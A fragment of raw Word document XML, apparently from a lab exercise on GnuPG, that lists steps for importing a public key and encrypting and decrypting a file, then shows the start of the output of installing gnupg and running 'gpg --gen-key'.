          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cer</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ca</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="6495"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>4.  I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>port</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pub</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of rece</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ver</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5620"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">5.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ncrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>-r</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="3496"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>6.  Decrypt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>at</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rece</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>er w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>op</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on -d</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0" w:line="280" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8779"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4624"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId38">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 yum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gnupg</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5011"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:hyperlink r:id="rId39">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 gpg --gen-key</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="2570"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">gpg </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>GnuPG) 1.4.19;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Copyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ght</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(C) 2015 Free Sof</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ware Founda</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">on, Inc. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s free</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>war</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>you are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">free </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o chan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:t>e and re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>bu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4001"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>here</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-28"/>
        </w:rPr>
        <w:t>W</w:t>
      </w:r>
      <w:r>
        <w:t>ARRAN</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-31"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>per</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ed by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-15"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5032"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:t>gpg:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t/</w:t>
      </w:r>
      <w:r>
        <w:t>.gnup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>secr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.gpg' cre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed gpg:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keyr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>`</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>roo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t/</w:t>
      </w:r>
      <w:r>
        <w:t>.gnup</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:t>pubr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.gpg' cre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ease se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>ct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>what</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nd of key you wan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="280" w:right="6822"/>
      </w:pPr>
      <w:r>
        <w:t>(1) RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(defau</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>lt</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) (2) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>SA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="280" w:right="7507"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">(3) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:t>SA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gn on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y) (4) RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gn</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="7936"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>Y</w:t>
      </w:r>
      <w:r>
        <w:t>our se</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>? 1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="4588"/>
      </w:pPr>
      <w:r>
        <w:t>RSA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-13"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ke</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ay be be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
